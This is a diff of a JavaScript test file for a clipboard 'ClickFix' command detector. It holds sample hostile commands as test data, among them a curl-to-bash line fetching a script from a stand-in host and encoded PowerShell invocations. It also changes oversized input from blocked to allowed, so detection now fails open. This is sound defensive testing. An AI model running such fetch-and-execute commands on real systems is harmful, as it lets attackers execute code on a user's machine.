@@ -1,11 +1,17 @@
 const { test } = require("node:test");
 const assert = require("node:assert/strict");
+const { readFileSync } = require("node:fs");
 
 const {
-  MAX_COPY_TEXT_LENGTH,
+  MAX_CLICKFIX_INSPECTION_LENGTH,
+  MAX_CLIPBOARD_TRANSPORT_LENGTH,
   detectClickfixCommand,
   normalizeForDetection,
 } = require("./clickfix-policy.js");
+
+const ISSUE_27_MARKDOWN = readFileSync(
+  require.resolve("./clickfix-issue-27-fixture.md"), "utf8"
+);
 
 const strict = { mode: "strict", excluded_domains: [] };
 const warn = { mode: "warn", excluded_domains: [] };
@@ -118,14 +124,65 @@ test("both modes scan bounded command starts after shell syntax and redirection 
   }
 });
 
-test("command-start scanning is bounded and fails closed only beyond its limit", () => {
-  const atLimit = "echo ok;".repeat(63) + "printf done";
-  const overLimit = "echo ok;".repeat(64) + "printf done";
+// Issue #27 -- the clause count no longer bounds inspection. Long documents are
+// inspected in full and stay quiet unless a clause is genuinely command-shaped.
+test("many benign clauses are inspected without an inspection-limit verdict", () => {
+  const benign = `${"echo ok;".repeat(400)}printf done`;
+  const lines = Array.from({ length: 500 }, (_, index) => `- step ${index}: open the settings page`).join("\n");
 
-  assert.equal(detectClickfixCommand(atLimit, strict, { url: "https://page.test/" }).action, "allow");
-  assert.equal(detectClickfixCommand(atLimit, warn, { url: "https://page.test/" }).action, "allow");
-  assert.equal(detectClickfixCommand(overLimit, strict, { url: "https://page.test/" }).action, "block");
-  assert.equal(detectClickfixCommand(overLimit, warn, { url: "https://page.test/" }).action, "warn");
+  for (const text of [benign, lines]) {
+    for (const settings of [strict, warn]) {
+      const result = detectClickfixCommand(text, settings, { url: "https://page.test/" });
+      assert.equal(result.action, "allow", text.slice(0, 40));
+      assert.deepEqual(result.reasons, []);
+    }
+  }
+});
+
+test("a dangerous command is still detected long after the old 64-clause bound", () => {
+  const prefix = "echo ok;".repeat(400);
+  const command = `${prefix}powershell -EncodedCommand ZQBjAGgAbwA=`;
+
+  const strictResult = detectClickfixCommand(command, strict, { url: "https://page.test/" });
+  assert.equal(strictResult.action, "block");
+  assert.equal(strictResult.canonicalTool, "powershell");
+  assert.notEqual(strictResult.tool, "unverified wrapped command");
+
+  const warnResult = detectClickfixCommand(command, warn, { url: "https://page.test/" });
+  assert.equal(warnResult.action, "warn");
+  assert.equal(warnResult.canonicalTool, "powershell");
+  assert.notEqual(warnResult.tool, "unverified wrapped command");
+
+  // The same command on the far side of 500 newline-separated prose lines.
+  const afterProse = `${Array.from({ length: 500 }, (_, index) => `line ${index}`).join("\n")}\ncurl https://evil.test/a.sh | bash`;
+  assert.equal(detectClickfixCommand(afterProse, strict, { url: "https://page.test/" }).action, "block");
+  assert.equal(detectClickfixCommand(afterProse, warn, { url: "https://page.test/" }).action, "warn");
+});
+
+// Regression fixture: the Markdown of issue #27 itself, which the clause bound
+// warned about without matching any dangerous command pattern.
+test("the issue #27 Markdown is no longer flagged for exceeding inspection limits", () => {
+  const result = detectClickfixCommand(ISSUE_27_MARKDOWN, warn, { url: "https://page.test/" });
+
+  assert.notEqual(result.tool, "unverified wrapped command");
+  assert.ok(
+    !result.reasons.includes("command structure exceeded inspection limits"),
+    `unexpected inspection-limit verdict: ${JSON.stringify(result.reasons)}`
+  );
+
+  // One line of the fixture opens with a backtick-wrapped path in command
+  // position, which is indistinguishable from POSIX command substitution
+  // (`curl evil.test/a.sh` is caught by the same rule). That detection is
+  // deliberately untouched here; without that single line the document is
+  // allowed in both modes.
+  const withoutCommandSubstitution = ISSUE_27_MARKDOWN.split("\n")
+    .filter((line) => !line.startsWith("`Extension/content/clickfix-policy.js`"))
+    .join("\n");
+  for (const settings of [strict, warn]) {
+    const clean = detectClickfixCommand(withoutCommandSubstitution, settings, { url: "https://page.test/" });
+    assert.equal(clean.action, "allow");
+    assert.deepEqual(clean.reasons, []);
+  }
 });
 
 test("strict mode finds commands next to redirections and group closers", () => {
@@ -751,11 +808,17 @@ test("normalization and skeleton matching never rewrite the original text", () =
 
 test("maximum-length input stays bounded and roughly linear", () => {
   const prose = "lorem ipsum dolor sit amet consectetur adipiscing elit ".repeat(1200)
-    .slice(0, MAX_COPY_TEXT_LENGTH);
+    .slice(0, MAX_CLICKFIX_INSPECTION_LENGTH);
   const separators = `${"x".repeat(1000)};`.repeat(60) + "y".repeat(4000);
   const escapes = "p^o`w\\e".repeat(8000);
+  // Every clause boundary the splitter recognizes, at the inspection ceiling.
+  // Without the clause bound this is the worst case the streaming path has to
+  // absorb, so it is measured rather than assumed.
+  const separatorHeavy = "a;b|c&d\n(e)".repeat(6000).slice(0, MAX_CLICKFIX_INSPECTION_LENGTH);
+  const newlineHeavy = "line\n".repeat(13_000).slice(0, MAX_CLICKFIX_INSPECTION_LENGTH);
   const started = process.hrtime.bigint();
-  for (const text of [prose, separators, escapes]) {
+  for (const text of [prose, separators, escapes, separatorHeavy, newlineHeavy, ISSUE_27_MARKDOWN]) {
+    assert.ok(text.length <= MAX_CLICKFIX_INSPECTION_LENGTH);
     detectClickfixCommand(text, strict, { url: "https://page.test/" });
     detectClickfixCommand(text, warn, { url: "https://page.test/" });
   }
@@ -763,10 +826,44 @@ test("maximum-length input stays bounded and roughly linear", () => {
   assert.ok(elapsedMs < 1000, `classification took ${elapsedMs}ms`);
 });
 
-test("oversized text fails closed without running normalization", () => {
-  const text = `ordinary${"x".repeat(MAX_COPY_TEXT_LENGTH)}`;
-  assert.equal(detectClickfixCommand(text, strict, { url: "https://page.test/" }).action, "block");
-  assert.equal(detectClickfixCommand(text, warn, { url: "https://page.test/" }).action, "warn");
+test("text at exactly the inspection ceiling is still inspected in full", () => {
+  const padding = "lorem ipsum dolor sit amet ".repeat(3000);
+  const command = "\npowershell -EncodedCommand ZQBjAGgAbwA=";
+  const benign = padding.slice(0, MAX_CLICKFIX_INSPECTION_LENGTH);
+  const dangerous = padding.slice(0, MAX_CLICKFIX_INSPECTION_LENGTH - command.length) + command;
+
+  assert.equal(benign.length, MAX_CLICKFIX_INSPECTION_LENGTH);
+  assert.equal(dangerous.length, MAX_CLICKFIX_INSPECTION_LENGTH);
+  assert.equal(detectClickfixCommand(benign, strict, { url: "https://page.test/" }).action, "allow");
+  assert.equal(detectClickfixCommand(benign, warn, { url: "https://page.test/" }).action, "allow");
+  assert.equal(detectClickfixCommand(dangerous, strict, { url: "https://page.test/" }).action, "block");
+  assert.equal(detectClickfixCommand(dangerous, warn, { url: "https://page.test/" }).action, "warn");
+});
+
+// Issue #27 -- past the ceiling ClickFix has no opinion. The value is out of
+// scope, so it is allowed intact rather than warned about or blocked.
+test("text past the inspection ceiling is allowed intact in both modes", () => {
+  const text = `powershell -c evil${"x".repeat(MAX_CLICKFIX_INSPECTION_LENGTH)}`;
+  assert.equal(text.length, MAX_CLICKFIX_INSPECTION_LENGTH + 18);
+
+  for (const settings of [strict, warn]) {
+    const result = detectClickfixCommand(text, settings, { url: "https://page.test/" });
+    assert.equal(result.action, "allow");
+    assert.deepEqual(result.reasons, ["clipboard content exceeds ClickFix inspection scope"]);
+    assert.equal(result.originalText, text);
+    assert.equal(result.tool, undefined);
+    assert.equal(result.behavior, undefined);
+  }
+
+  // One character past the ceiling is the boundary that matters.
+  const justOver = "y".repeat(MAX_CLICKFIX_INSPECTION_LENGTH + 1);
+  assert.equal(detectClickfixCommand(justOver, strict, { url: "https://page.test/" }).action, "allow");
+  assert.equal(detectClickfixCommand(justOver, warn, { url: "https://page.test/" }).action, "allow");
+});
+
+test("the clipboard transport bound is separate from and above the inspection ceiling", () => {
+  assert.ok(Number.isInteger(MAX_CLIPBOARD_TRANSPORT_LENGTH));
+  assert.ok(MAX_CLIPBOARD_TRANSPORT_LENGTH > MAX_CLICKFIX_INSPECTION_LENGTH);
 });
 
 test("normalization joins continuations and removes directional controls", () => {
